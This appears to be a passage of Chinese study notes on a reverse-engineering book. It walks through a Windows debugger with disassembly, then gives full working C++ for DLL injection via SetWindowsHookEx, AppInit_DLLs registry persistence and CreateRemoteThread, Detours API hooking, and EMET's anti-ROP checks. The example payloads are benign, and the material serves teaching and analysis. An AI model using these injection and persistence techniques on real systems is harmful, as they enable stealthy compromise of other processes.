> wdbg01a.cpp中，当接收到调试事件时，会使用printf函数将事件的内容显示出来。通过访问union定义的结构体就可获得调试对象的信息
> 当处理器被交给调试器时，调试对象会暂停运行。因此，在调试器显示消息的过程中，调试对象出于暂停状态。
> 调用ContinueDebugEvent函数可以让调试对象恢复运行，这时调试器又回到WaitForDebugEvent函数等待下一条调试事件。

运行示例：
![调试IE](/img/interestingBin/1489219141371.png)

> 创建进程、线程、以及加载、卸载DLL等事件被调试器捕捉到。


### 实现反汇编功能

在发生异常的时候，能够显示发生异常的地址以及当前寄存器的值，也能显示发生异常时所执行的指令，这就要实现反汇编功能。

可以使用[udis86](https://github.com/vmt/udis86)这个开源的反汇编器实现反汇编。(本书作者提供的编译后的版本https://github.com/kenjiaiko/udis86)

```c
#include "stdafx.h"

#include <Windows.h>
#include "udis86.h"

#pragma comment(lib, "libudis86.lib")


int disas(unsigned char *buff, char *out, int size)
{
	ud_t ud_obj;
	ud_init(&ud_obj);
	ud_set_input_buffer(&ud_obj, buff, 32);

	ud_set_mode(&ud_obj, 32);

	ud_set_syntax(&ud_obj, UD_SYN_INTEL);

	if(ud_disassemble(&ud_obj)){
		sprintf_s(out, size, "%14s  %s", 
			ud_insn_hex(&ud_obj), ud_insn_asm(&ud_obj));
	}else{
		return -1;
	}

	return (int)ud_insn_len(&ud_obj);
}


int exception_debug_event(DEBUG_EVENT *pde)
{
	DWORD dwReadBytes;

	HANDLE ph = OpenProcess(
		PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_VM_OPERATION, 
		FALSE, pde->dwProcessId);
	if(!ph)
		return -1;

	HANDLE th = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT, 
		FALSE, pde->dwThreadId);
	if(!th)
		return -1;

	CONTEXT ctx;
	ctx.ContextFlags = CONTEXT_ALL;
	GetThreadContext(th, &ctx);
	
	char asm_string[256];
	unsigned char asm_code[32];

	ReadProcessMemory(ph, (VOID *)ctx.Eip, asm_code, 32, &dwReadBytes);
	if(disas(asm_code, asm_string, sizeof(asm_string)) == -1)
		asm_string[0] = '\0';

	printf("Exception: %08x (PID:%d, TID:%d)\n", 
		pde->u.Exception.ExceptionRecord.ExceptionAddress,
		pde->dwProcessId, pde->dwThreadId);
	printf("  %08x: %s\n", ctx.Eip, asm_string);
	printf("    Reg: EAX=%08x ECX=%08x EDX=%08x EBX=%08x\n", 
		ctx.Eax, ctx.Ecx, ctx.Edx, ctx.Ebx);
	printf("         ESI=%08x EDI=%08x ESP=%08x EBP=%08x\n", 
		ctx.Esi, ctx.Edi, ctx.Esp, ctx.Ebp);

	SetThreadContext(th, &ctx);
	CloseHandle(th);
	CloseHandle(ph);
	return 0;
}


int _tmain(int argc, _TCHAR* argv[])
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	
	if(argc < 2){
		fprintf(stderr, "C:\\>%s <sample.exe>\n", argv[0]);
		return 1;
	}

	memset(&pi, 0, sizeof(pi));
	memset(&si, 0, sizeof(si));
	si.cb = sizeof(STARTUPINFO);

	BOOL r = CreateProcess(
		NULL, argv[1], NULL, NULL, FALSE, 
		NORMAL_PRIORITY_CLASS | CREATE_SUSPENDED | DEBUG_PROCESS,
		NULL, NULL, &si, &pi);
	if(!r)
		return -1;

	ResumeThread(pi.hThread);

	int process_counter = 0;

	do{
		DEBUG_EVENT de;
		if(!WaitForDebugEvent(&de, INFINITE))
			break;
		
		DWORD dwContinueStatus = DBG_CONTINUE;
		
		switch(de.dwDebugEventCode)
		{
		case CREATE_PROCESS_DEBUG_EVENT:
			process_counter++;
			break;
		case EXIT_PROCESS_DEBUG_EVENT:
			process_counter--;
			break;
		case EXCEPTION_DEBUG_EVENT:
			if(de.u.Exception.ExceptionRecord.ExceptionCode != 
				EXCEPTION_BREAKPOINT)
			{
				dwContinueStatus = DBG_EXCEPTION_NOT_HANDLED;
			}
			exception_debug_event(&de);
			break;
		}

		ContinueDebugEvent(
			de.dwProcessId, de.dwThreadId, dwContinueStatus);

	}while(process_counter > 0);

	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
	return 0;
}
```

disas函数负责对机器语言进行反汇编，在此使用了udis86的功能。

`execption_debug_event`函数会在发生异常时运行，其中调用了下列函数：

* `OpenProcess`（https://msdn.microsoft.com/en-us/library/windows/desktop/ms684320(v=vs.85).aspx）
* `ReadProcessMemory`(https://msdn.microsoft.com/en-us/library/windows/desktop/ms680553(v=vs.85).aspx)
* `OpenThread`(https://msdn.microsoft.com/en-us/library/windows/desktop/ms684335(v=vs.85).aspx)
* `GetThreadContext`(https://msdn.microsoft.com/en-us/library/windows/desktop/ms679362(v=vs.85).aspx)
* `SetThreadContext`()

以上函数再加上`WriteProcessMemory`数（https://msdn.microsoft.com/en-us/library/windows/desktop/ms681674(v=vs.85).aspx），就是用于访问其他进程的必要函数。

在Windows中，即便程序不作为调试器挂载在目标进程上，只要能够获取目标进程的句柄，就可随意读写该进程的内存空间。若当前用户没有相应的权限，调用OpenProcess会失败，但只要能够通过其他方法获取进程句柄，也可自由读写该进程的内存空间。

[OpenProcess](https://msdn.microsoft.com/en-us/library/windows/desktop/ms684320(v=vs.85).aspx)函数：


```cpp
HANDLE WINAPI OpenProcess(
  _In_ DWORD dwDesiredAccess, //访问标志
  _In_ BOOL  bInheritHandle,  //句柄继承选项
  _In_ DWORD dwProcessId //进程ID
);
```

在`exeception_debug_event`函数中，为了获取发生异常时所执行的指令，需要`ReadProcessMemory`函数。

[ReadProcessMemory](https://msdn.microsoft.com/en-us/library/windows/desktop/ms680553(v=vs.85).aspx)函数：

```cpp
BOOL WINAPI ReadProcessMemory(
  _In_  HANDLE  hProcess, //进程句柄
  _In_  LPCVOID lpBaseAddress, //读取起始地址
  _Out_ LPVOID  lpBuffer, //存放数据的缓冲区
  _In_  SIZE_T  nSize, //要读取字节数
  _Out_ SIZE_T  *lpNumberOfBytesRead //实际读取字节数
);
```

[WriteProcessMemory](https://msdn.microsoft.com/en-us/library/windows/desktop/ms681674(v=vs.85).aspx)函数：

```cpp
BOOL WINAPI WriteProcessMemory(
  _In_  HANDLE  hProcess, //进程句柄
  _In_  LPVOID  lpBaseAddress, //写入起始地址
  _In_  LPCVOID lpBuffer, //数据缓冲区
  _In_  SIZE_T  nSize,  //要写入的字节数
  _Out_ SIZE_T  *lpNumberOfBytesWritten //实际写入的字节数
);
```
接下来是对寄存器的读写：
用`OpenThread`打开线程之后，可通过`GetThreadContext`和`SetThreadContext`来读写寄存器。

由于不需要在execption_debug_event中改写寄存器的值，因此不需要调用SetThreadContext函数。

[OpenThread](https://msdn.microsoft.com/en-us/library/windows/desktop/ms684335(v=vs.85).aspx)函数：

```cpp
HANDLE WINAPI OpenThread(
  _In_ DWORD dwDesiredAccess, //访问标志
  _In_ BOOL  bInheritHandle, //句柄继承选项
  _In_ DWORD dwThreadId  //线程ID
);
```

[GetThreadContext](https://msdn.microsoft.com/en-us/library/windows/desktop/ms679362(v=vs.85).aspx)函数：

```cpp
BOOL WINAPI GetThreadContext(
  _In_    HANDLE    hThread, //拥有上下文的线程句柄
  _Inout_ LPCONTEXT lpContext //接收上下文的结构体地址
);
```

[SetThreadContext](https://msdn.microsoft.com/en-us/library/windows/desktop/ms680632(v=vs.85).aspx)

```cpp
BOOL WINAPI SetThreadContext(
  _In_       HANDLE  hThread, //拥有上下文的线程句柄
  _In_ const CONTEXT *lpContext //存放上下文的结构体地址
);
```

使用这些API函数就可操作其他进程。

使用改良版的调试器wdbg02a.exe对 一个异常程序test.exe调试：

![改良调试器](/img/interestingBin/1489224170719.png)

在 mov byte[eax]，0xff的地方发生了第二个异常，对应test.exe源码中的`*s=0xFF`这行。

## 代码注入

在其他进程中运行任意代码的手法，统称为代码注入。在使用DLL的情况下，一般叫做“DLL注入”，但“在其他进程中运行自己的代码”这点是共通的。

![代码注入](/img/interestingBin/1491402463265.png)

首先向目标进程target.exe插入代码与数据，在此过程中，代码以线程(Thread Procedure)形式插入，而代码中使用的数据则以线程参数的形式传入。即代码与数据是分别注入的。

关于代码注入知名文章：
[Three-Ways-to-Inject-Your-Code-into-Another-Proces](https://www.codeproject.com/Articles/4610/Three-Ways-to-Inject-Your-Code-into-Another-Proces)

### 用SetWindowsHookEx劫持系统消息

用以下三个API函数，可以劫持系统消息
- SetWindowsHookEx
- CallNextHookEx
- UnhookWindowsHookEx

> 这些函数都是Windows官方API ，可以因为用于单个线程，也可以用于进程

> SetWidowsHookEx的功能是将原本传递给窗口过程的消息劫持下来，交给第二参数所指定的函数来进行处理



SetWindowsHookEx:

```cpp
HHOOK WINAPI SetWindowsHookEx(
  _In_ int       idHook, //钩子类型
  _In_ HOOKPROC  lpfn, //钩子过程
  _In_ HINSTANCE hMod, //应用程序实例的句柄
  _In_ DWORD     dwThreadId //线程ID
);
```

CallNextHookEx：

```cpp
LRESULT WINAPI CallNextHookEx(
  _In_opt_ HHOOK  hhk, //当前钩子的句柄
  _In_     int    nCode,  //传递给钩子过程的代码
  _In_     WPARAM wParam, //传递给钩子过程的值
  _In_     LPARAM lParam //传递给钩子过程的值
);
```

UnhookWindowsHookEx：

```cpp
BOOL WINAPI UnhookWindowsHookEx(
  _In_ HHOOK hhk   //要解除的对象的钩子过程句柄
);
```

例子：

将loging.cpp编译成DLL，然后调用SetWindowsHookEx，将其第4参数(dwThreadId)设为0.这样就可以对持有窗口过程的进程和线程应用钩子，也就是加载目标DLL。

```cpp
// dllmain.cp
//

#include "stdafx.h"


int WriteLog(TCHAR *szData)
{
	TCHAR szTempPath[1024];
	GetTempPath(sizeof(szTempPath), szTempPath);
	lstrcat(szTempPath, "loging.log");
	
	TCHAR szModuleName[1024];
	GetModuleFileName(GetModuleHandle(NULL), 
		szModuleName, sizeof(szModuleName));

	TCHAR szHead[1024];
	wsprintf(szHead, "[PID:%d][Module:%s] ", 
		GetCurrentProcessId(), szModuleName);

	HANDLE hFile = CreateFile(
		szTempPath, GENERIC_WRITE, 0, NULL,
		OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if(hFile == INVALID_HANDLE_VALUE)
		return -1;

	SetFilePointer(hFile, 0, NULL, FILE_END);

	DWORD dwWriteSize;
	WriteFile(hFile, szHead, lstrlen(szHead), &dwWriteSize, NULL);
	WriteFile(hFile, szData, lstrlen(szData), &dwWriteSize, NULL);

	CloseHandle(hFile);
	return 0;
}


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		WriteLog("DLL_PROCESS_ATTACH\n");
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
		WriteLog("DLL_PROCESS_DETACH\n");
		break;
	}
	return TRUE;
}
```

向以上代码添加代码，使得在DLL成功加载之后，向`%TEMP%`目录输出一个名为loging.log的日志文件。日志内容是进程ID和模块路径。


```cpp
// setwindowshook.cpp
//

#include "stdafx.h"
#include <Windows.h>


int _tmain(int argc, _TCHAR* argv[])
{
	if(argc < 2){
		fprintf(stderr, "%s <DLL Name>\n", argv[0]);
		return 1;
	}

	HMODULE h = LoadLibrary(argv[1]);
	if(h == NULL)
		return -1;

	int (__stdcall *fcall) (VOID);
	fcall = (int (WINAPI *)(VOID))
		GetProcAddress(h, "CallSetWindowsHookEx");
	if(fcall == NULL){
		fprintf(stderr, "ERROR: GetProcAddress\n");
		goto _Exit;
	}

	int (__stdcall *ffree) (VOID);
	ffree = (int (WINAPI *)(VOID))
		GetProcAddress(h, "CallUnhookWindowsHookEx");
	if(ffree == NULL){
		fprintf(stderr, "ERROR: GetProcAddress\n");
		goto _Exit;
	}

	if(fcall()){
		fprintf(stderr, "ERROR: CallSetWindowsHookEx\n");
		goto _Exit;
	}
	printf("Call SetWindowsHookEx\n");

	getchar();

	if(ffree()){
		fprintf(stderr, "ERROR: CallUnhookWindowsHookEx\n");
		goto _Exit;
	}
	printf("Call UnhookWindowsHookEx\n");

_Exit:
	FreeLibrary(h);
	return 0;
}
```

打开`C:\Users\b404\AppData\Local\Temp\loging.log`文件：

![运行效果](/img/interestingBin/1491377631991.png)



### 将DLL路径配置到注册表的AppLnit_DLLs项

SetWindowsHookEx可以在调用时，将DLL映射到其他进程中，不过若将DLL的路径配置在注册表的AppInit_DLLs项中，就可以在系统启动时，将任意DLL加载到其他进程中。
运行regedit,在`SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows`中找到`AppInit_DLLs`（在这里填写DLL路径）和`LoadAppInit_DLLs`（AppInit_DLLs启用或禁止）
![Alt text](/img/interestingBin/1491378176972.png)

> Widows XP中没有LoadAppInit_DLLs这项。在Win7中多了一个叫做`RequireSignedAppInit_DLLs`的项，这一项代表只允许加载经过签名的DLL。

详细可看：[AppInit_DLLs in Windows 7 and Windows Server 2008 R2](https://msdn.microsoft.com/en-us/library/windows/desktop/dd744762(v=vs.85).aspx)

在x64系统中，关于x32程序的相关设定已被重定向到Wow6432Node中。
AppInit_DLLs中所配置的DLL是通过user32.dll来加载的，因此，对于原本就不依赖(不加载)user32.dll的进程来说，这个配置是无效的。

```cpp
// writeappinit.cpp
//

#include "stdafx.h"
#include <Windows.h>


int _tmain(int argc, _TCHAR* argv[])
{
	if(argc < 2){
		fprintf(stderr, "%s <DLL Name>\n", argv[0]);
		return 1;
	}
	
	HKEY hKey;
	LSTATUS lResult = RegOpenKeyEx(HKEY_LOCAL_MACHINE, 
		"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows",
		NULL, KEY_ALL_ACCESS, &hKey);
	if(lResult != ERROR_SUCCESS){
		printf("Error: RegOpenKeyEx failed.\n");
		return -1;
	}

	DWORD dwSize, dwType;
	TCHAR szDllName[256];

	RegQueryValueEx(hKey, "AppInit_DLLs", NULL, &dwType, NULL, &dwSize);
    RegQueryValueEx(hKey, "AppInit_DLLs", NULL, &dwType, (LPBYTE)szDllName, &dwSize);
	printf("AppInit_DLLs: %s -> ", szDllName);
	lstrcpy(szDllName, argv[1]);
	
	lResult = RegSetValueEx(hKey, "AppInit_DLLs", 
		0, REG_SZ, (PBYTE)szDllName, lstrlen(szDllName) + 1);
	if(lResult != ERROR_SUCCESS){
		printf("Error: RegSetValueEx failed.\n");
	}

	RegQueryValueEx(hKey, "AppInit_DLLs", NULL, &dwType, NULL, &dwSize);
    RegQueryValueEx(hKey, "AppInit_DLLs", NULL, &dwType, (LPBYTE)szDllName, &dwSize);
	printf("%s\n", szDllName);

	RegCloseKey(hKey);
	return 0;
}
```
运行程序：
![Alt text](/img/interestingBin/1491382019538.png)

> 在Win7中，需要将`LoadAppInit_DLLs`的值改为1

使用该程序向注册表的AppInit_DLLs项写入loging.dll的路径。此后，凡是加载了user32.dll的进程，同时也会加载`loging.dll`。



### 通过CreateRemoteThread在其他进程中创建线程

使用`CreateRemoteThread`这个API函数在其他进程中创建线程，这个函数可以在新线程中运行LoadLibrary，从而使得其他进程强制加载某个DLL。

```cpp
HANDLE WINAPI CreateRemoteThread(
  _In_  HANDLE                 hProcess,  //进程句柄
  _In_  LPSECURITY_ATTRIBUTES  lpThreadAttributes, 
  _In_  SIZE_T                 dwStackSize, //栈初始长度(字节数)
  _In_  LPTHREAD_START_ROUTINE lpStartAddress, 
  _In_  LPVOID                 lpParameter, //新线程的参数指针
  _In_  DWORD                  dwCreationFlags, //创建标志
  _Out_ LPDWORD                lpThreadId //分配的线程ID指针
);
```

**Loadlibrary的参数必须位于目标进程内部。因此，LoadLibrary所需要的参数字符串必须事先写入目标进程的内存空间**

```cpp
// injectcode.h

int InjectDLLtoProcessFromName(TCHAR *szTarget, TCHAR *szDllPath);
int InjectDLLtoProcessFromPid(DWORD dwPid, TCHAR *szDllPath);
int InjectDLLtoNewProcess(TCHAR *szCommandLine, TCHAR *szDllPath);
```

上面三个函数的功能：
* InjectDLLtoProcessFromName:按照可执行文件名找到相应的进程并注入DLL
* InjectDLLtoProcessFromPid：按照进程ID找到相应的进程并注入DLL
* 创建新进程并注入DLL


```cpp
// injectcode.cpp
//

#include "stdafx.h"
#include <tlhelp32.h>
#include "injectcode.h"


DWORD GetProcessIdFromName(TCHAR *szTargetProcessName)
{
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	
	if(hSnap == INVALID_HANDLE_VALUE)
		return 0;
	
	PROCESSENTRY32 pe;
	pe.dwSize = sizeof(pe);
	
	DWORD dwProcessId = 0;
	BOOL bResult = Process32First(hSnap, &pe);

	while(bResult){
		if(!lstrcmp(pe.szExeFile, szTargetProcessName)){
			dwProcessId = pe.th32ProcessID;
			break;
		}
		bResult = Process32Next(hSnap, &pe);
	}
	CloseHandle(hSnap);
	
	return dwProcessId;
}


int InjectDLL(HANDLE hProcess, TCHAR *szDllPath)
{
	int szDllPathLen = lstrlen(szDllPath) + 1;

	PWSTR RemoteProcessMemory = (PWSTR)VirtualAllocEx(hProcess, 
		NULL, szDllPathLen, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
	if(RemoteProcessMemory == NULL)
		return -1;
	
	BOOL bRet = WriteProcessMemory(hProcess, 
		RemoteProcessMemory, (PVOID)szDllPath, szDllPathLen, NULL);
	if(bRet == FALSE)
		return -1;
	
	PTHREAD_START_ROUTINE pfnThreadRtn;
	pfnThreadRtn = (PTHREAD_START_ROUTINE)GetProcAddress(
		GetModuleHandle("kernel32"), "LoadLibraryA");
	if(pfnThreadRtn == NULL)
		return -1;
	
	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, 
		pfnThreadRtn, RemoteProcessMemory, 0, NULL);
	if(hThread == NULL)
		return -1;

	WaitForSingleObject(hThread, INFINITE);
	
	VirtualFreeEx(hProcess, 
		RemoteProcessMemory, szDllPathLen, MEM_RELEASE);

	CloseHandle(hThread);
	return 0;
}


int InjectDLLtoExistedProcess(DWORD dwPid, TCHAR *szDllPath)
{
	HANDLE hProcess = OpenProcess(
		PROCESS_CREATE_THREAD | PROCESS_VM_READ | PROCESS_VM_WRITE | 
		PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION , FALSE, dwPid);
	if(hProcess == NULL)
		return -1;
	/*
	BOOL bJudgeWow64;
	IsWow64Process(hProcess, &bJudgeWow64);
	if(bJudgeWow64 == FALSE){
		CloseHandle(hProcess);
		return -1;
	}
	*/
	if(InjectDLL(hProcess, szDllPath))
		return -1;

	CloseHandle(hProcess);
	return 0;
}


int InjectDLLtoProcessFromName(TCHAR *szTarget, TCHAR *szDllPath)
{
	DWORD dwPid = GetProcessIdFromName(szTarget);
	if(dwPid == 0)
		return -1;
	if(InjectDLLtoExistedProcess(dwPid, szDllPath))
		return -1;
	return 0;
}


int InjectDLLtoProcessFromPid(DWORD dwPid, TCHAR *szDllPath)
{
	if(InjectDLLtoExistedProcess(dwPid, szDllPath))
		return -1;
	return 0;
}


int InjectDLLtoNewProcess(TCHAR *szCommandLine, TCHAR *szDllPath)
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(STARTUPINFO));
	si.cb = sizeof(STARTUPINFO);

	BOOL bResult = CreateProcess(NULL, szCommandLine, NULL, NULL,
		FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
	if(bResult == FALSE)
		return -1;

	int nRet = -1;
	/*
	BOOL bJudgeWow64;
	IsWow64Process(pi.hProcess, &bJudgeWow64);
	if(bJudgeWow64 == FALSE)
		goto _Exit;
	*/
	if(InjectDLL(pi.hProcess, szDllPath))
		goto _Exit;

	nRet = 0;

_Exit:
	ResumeThread(pi.hThread);
	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
	return nRet;
}
```

运行该程序时，以及IE关闭时都会弹出相应的消息框。

### 注入函数

只要能够将任意函数(代码)事先复制到目标进程内部，就可以用`CreateRemoteThread`来运行。

> 在Windows中，只要拥有足够的权限，就可以随意访问其他进程的内存空间，基本可以自由地向其他进程注入代码，而且即便程序不是调试器，也可以比较容易地骗过其他的进程。

**代码注入要实现的功能和DLL注入类似，但代码注入的优点如下：**
- **占用内存少**
 - 若注入的数据或代码比较少，直接采用代码注入可达到效果，且占用内存比较少

- **难以查找痕迹**
 - 采用DLL注入会在目标进程中留下相关痕迹，很容易被判断出目标进程是否执行过注入操作。采用代码注入几乎不会留下任何痕迹，所以恶意代码中大量使用代码注入

- **其他**
 

**DLL注入技术主要用于在代码量大且复杂的时候，而代码注入技术则适用于代码量小且简单的情况**

 
## API钩子

在程序中插入额外的逻辑称为“钩子”，而其中对API插入额外逻辑称为“API钩子”。钩子是一种截取信息、更改程序执行流向、添加新功能的技术。

API钩子大体分为两种：
- 改写目标函数开头几个字节
- 改写IAT(导入表)

> IAT型钩子详细可见[Advanced Windows](https://www.amazon.com/dp/1572315482)

API钩子技术图表：
![API钩子技术图表](/img/interestingBin/1491403435120.png)


### 用Detours实现一个简单的API钩子

使用[Detours](https://www.microsoft.com/en-us/research/project/detours/)的API钩子库可以用少量代码实现API钩子。只要知道DLL所导出的函数，就可以在运行时对该函数的调用进行劫持。

```cpp
//detourshook.h
#ifdef DETOURSHOOK_EXPORTS
#define DETOURSHOOK_API __declspec(dllexport)
#else
#define DETOURSHOOK_API __declspec(dllimport)
#endif

DETOURSHOOK_API int WINAPI HookedMessageBoxA(HWND hWnd, 
	LPCTSTR lpText, LPCTSTR lpCaption, UINT uType);
```

以下代码可以将`user32.dll`导出的函数`MessageBoxA`替换成`HookedMessageBoxA`。

```
// dllmain.cpp
//

#include "stdafx.h"
#include "detours.h"
#include "detourshook.h"


static int (WINAPI * TrueMessageBoxA)(HWND hWnd, LPCTSTR lpText, 
	LPCTSTR lpCaption, UINT uType) = MessageBoxA;

DETOURSHOOK_API int WINAPI HookedMessageBoxA(HWND hWnd, 
	LPCTSTR lpText, LPCTSTR lpCaption, UINT uType)
{
	int nRet = TrueMessageBoxA(hWnd, lpText, "Hooked Message", uType);
	return nRet;
}


int DllProcessAttach(VOID)
{
	DetourRestoreAfterWith();
	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());
	DetourAttach(&(PVOID&)TrueMessageBoxA, HookedMessageBoxA);	
	if(DetourTransactionCommit() == NO_ERROR)
		return -1;
	return 0;
}


int DllProcessDetach(VOID)
{
	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());
	DetourDetach(&(PVOID&)TrueMessageBoxA, HookedMessageBoxA);
	DetourTransactionCommit();
	return 0;
}


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		DllProcessAttach();
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
		DllProcessDetach();
		break;
	}
	return TRUE;
}
```

将以下文件添加到工程中，并编译：
![代码文件](/img/interestingBin/1491390313942.png)

当DLLMain收到`DLL_PROCESS_ATTACH`消息时，会调用`DllProcessAttach()`函数。即，当DLL被加载到进程中时，API钩子就开始生效。
`DllProcessAttach`用于挂载钩子，`DllProcessDetach`用于解除钩子。
在函数内部，会先调用`DetourTransactionBegin`和`DetourUpdateThread`,然后再用`DetourAttach`或者`DetcourDetach`来挂载或解除钩子。
最后，程序调用`DetourTransactionCommit`函数并退出。

### 修改消息框的标题栏
`HookedMessageBoxA`函数的内部会调用`TrueMessageBoxA`，也就是原始的`MessageBoxA`函数。

为了确认`HookedMessageBoxA`确实被调用过，可以将消息框标题栏改为“Hooked Message”。


```cpp
// helloworld.cpp

#include "stdafx.h"
#include <Windows.h>


int _tmain(int argc, _TCHAR* argv[])
{
	HMODULE h = LoadLibrary("detourshook.dll");
	MessageBoxA(GetForegroundWindow(), 
		"Hello World! using MessageBoxA", "Message", MB_OK);
	FreeLibrary(h);
	return 0;
}

```
![标题栏变成"Hooked Message"](/img/interestingBin/1491390958676.png)

根据环境和对象文件不同，API钩子也有各种各样的实现方法，`Detours`是一种非常简单的方法来实现的，详情可见[Detours: Binary Interception of Win32 Functions ](https://www.cs.columbia.edu/~junfeng/10fa-e6998/papers/detours.pdf).

**钩子的原理是将函数开头的几个字节替换成jmp指令，强制跳转到另一个函数。**

> 以上所讲API钩子技术基本只适用于用户级的DLL所导出的函数，但也可以通过劫持非公开的API等方式，对运行在内核领域(Ring0)的驱动程序挂载钩子。


## 观察反ROP机制
EMET全称为[Enhanced Mitigation Experience Toolkit](https://support.microsoft.com/en-us/help/2458544/the-enhanced-mitigation-experience-toolkit)（增强减灾体验工具），是微软发布的免费漏洞缓解工具。EMET通过使用安全缓解技术，防止软件中的漏洞被成功利用。这些安全缓解技术不能保证漏洞不被利用。但是它使得利用变得困难。
EMET还提供了可配置的SSL / TLS证书固定功能打到证书信任。此功能旨在检测利用公钥（PKI）进行中间人攻击的攻击。

v3.5版本开始新增反ROP(Anti-ROP)机制

### ROPGuard

ROPGuard是一种检查“RETN所返回的目标有没有相对应的CALL”(即CALL-RETN匹配性)的机制，方案简单，却能有效监测出Return-into-libc和ROP攻击

CALL用来调用子程序，而在子程序的结尾，（大部分情况下）都会执行RETN，而子程序结尾的RETN所返回的目标地址，应该就是CALL指令的下面一条指令。
然而在Return-into-libc攻击中，RETN会跳转到函数的开头，而ROP攻击中则使用了非常多的RETN，这些都会导致出现“RETN并不是返回CALL的下一条指令”的情况。

因此，该方案的本质在于关注CALL和RETN的匹配性(调用栈回溯)，以此来检测ROP和Return-into-libc攻击。

## 分析恶意软件
 
- REMnux分析恶意软件:[REMnux](https://remnux.org/)是一个用于分析恶意软件操作的OS，基于Ubuntu开发
- ClamAV检测恶意软件和漏洞攻击
- 用Zero Wine Tryouts分析恶意软件

> Zero Wine Tryouts是一个开源的自动分析工具，只要将文件上传上去就可以显示结果。与REMnux不同点在于，它主要通过动态分析来得出结果。
